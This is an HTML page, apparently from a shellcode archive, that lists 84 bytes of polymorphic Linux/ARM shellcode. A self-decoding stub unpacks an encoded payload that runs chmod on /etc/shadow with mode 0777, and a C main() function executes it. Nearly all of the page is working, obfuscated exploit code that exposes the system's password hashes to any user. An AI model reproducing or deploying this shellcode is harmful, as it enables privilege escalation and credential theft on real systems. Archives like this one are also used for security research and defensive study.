<html><head><title>Linux/ARM - polymorphic chmod(/etc/shadow, 0777) - 84 Bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 | Title:    Linux/ARM - polymorphic chmod(&quot;/etc/shadow&quot;, 0777) - 84 Bytes
 | Type:     Shellcode
 | Author:   Florian Gaultier &lt;florian.gaultier@shell-storm.org&gt;
 | Platform: Linux ARM (ARM926EJ-S rev 5 (v51))
 | [+]       http://www.shell-storm.org
*/


#include &lt;stdio.h&gt;


char shellcode[] =
&quot;\x24\x60\x8f\xe2&quot;     //add r6, pc, #36
&quot;\x16\xff\x2f\xe1&quot;     //bx r6
&quot;\xde\x40\xa0\xe3&quot;     //mov r4, #222
&quot;\x01\x0c\x54\xe3&quot;     //cmp r4, #256
&quot;\x1e\xff\x2f\x81&quot;     //bxhi lr
&quot;\xde\x40\x44\xe2&quot;     //sub r4, r4, #222
&quot;\x04\x50\xde\xe7&quot;     //ldrb r5, [lr, r4]
&quot;\x02\x50\x85\xe2&quot;     //add r5, r5, #2 (add 2 at every shellcode's byte)
&quot;\x04\x50\xce\xe7&quot;     //strb r5, [lr, r4]
&quot;\xdf\x40\x84\xe2&quot;     //add r4, r4, #223
&quot;\xf7\xff\xff\xea&quot;     //b 8078
&quot;\xf5\xff\xff\xeb&quot;     //bl 8074
//shellcode crypted
&quot;\xff\x5e\x8d\xe0&quot;
&quot;\x14\xfd\x2d\xdf&quot;
&quot;\x76\x44&quot;
&quot;\x0a\x2e&quot;
&quot;\xfd\x1f&quot;
&quot;\xfd\x2f&quot;
&quot;\x0d\x25&quot;
&quot;\xff\xdd&quot;
&quot;\xff\x25&quot;
&quot;\xff\xdd&quot;
&quot;-cra-qf_bmu&quot;;


int main()
{
        (*(void(*)()) shellcode)();

return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
